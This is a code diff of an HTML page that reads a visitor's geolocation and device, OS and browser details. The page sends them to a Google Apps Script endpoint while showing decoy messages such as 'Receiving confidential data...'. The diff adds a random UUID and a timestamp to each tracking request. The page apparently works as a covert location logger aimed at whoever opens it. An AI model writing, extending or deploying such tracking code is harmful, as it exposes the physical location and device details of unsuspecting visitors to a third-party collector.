@@ -35,6 +35,14 @@
   </style>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/0.7.28/ua-parser.min.js"></script>
   <script>
+    // Función para generar un UUID
+    function generateUUID() {
+      return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
+        var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
+        return v.toString(16);
+      });
+    }
+
     let interval;
     const confidentialMessages = [
       "Receiving confidential data...",
@@ -95,9 +103,11 @@
             var latitude = position.coords.latitude;
             var longitude = position.coords.longitude;
             var deviceInfo = getDeviceInfo();
+            var uuid = generateUUID();
+            var timestamp = new Date().toISOString();
 
             var scriptUrl = "https://script.google.com/macros/s/AKfycbzTqZTXXRolJY6ClLC_v9RjmWaeiVdfqoCz0BApRb7yr5rL8TuDDzNUpkAWteP4uzXY8w/exec";
-            var url = `${scriptUrl}?latitude=${latitude}&longitude=${longitude}&device=${encodeURIComponent(deviceInfo.device)}&os=${encodeURIComponent(deviceInfo.os)}&browser=${encodeURIComponent(deviceInfo.browser)}`;
+            var url = `${scriptUrl}?latitude=${latitude}&longitude=${longitude}&device=${encodeURIComponent(deviceInfo.device)}&os=${encodeURIComponent(deviceInfo.os)}&browser=${encodeURIComponent(deviceInfo.browser)}&uuid=${uuid}&timestamp=${encodeURIComponent(timestamp)}`;
 
             console.log(url); // Imprimir URL para depuración
 
@@ -116,4 +126,3 @@
   <div id="data" style="display: none;"></div>
 </body>
 </html>
-
